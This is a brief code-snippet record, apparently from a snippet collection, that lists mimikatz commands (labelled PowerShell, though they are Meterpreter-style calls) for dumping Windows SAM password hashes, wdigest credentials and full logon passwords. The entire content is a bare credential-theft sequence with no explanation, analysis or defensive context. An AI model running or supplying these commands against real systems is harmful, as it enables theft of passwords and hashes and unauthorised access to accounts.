---
id: 9db2761c-d639-4091-8efb-f9bcaaf9e39c
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:21.535316+00:00'
updated_at: '2023-04-10T20:24:57.227226+00:00'
---

# Code Snippet 9db2761c

**Language**: Powershell

```powershell
load mimikatz
mimikatz_command -f version
mimikatz_command -f samdump::hashes
mimikatz_command -f sekurlsa::wdigest
mimikatz_command -f sekurlsa::searchPasswords
mimikatz_command -f sekurlsa::logonPasswords full
```


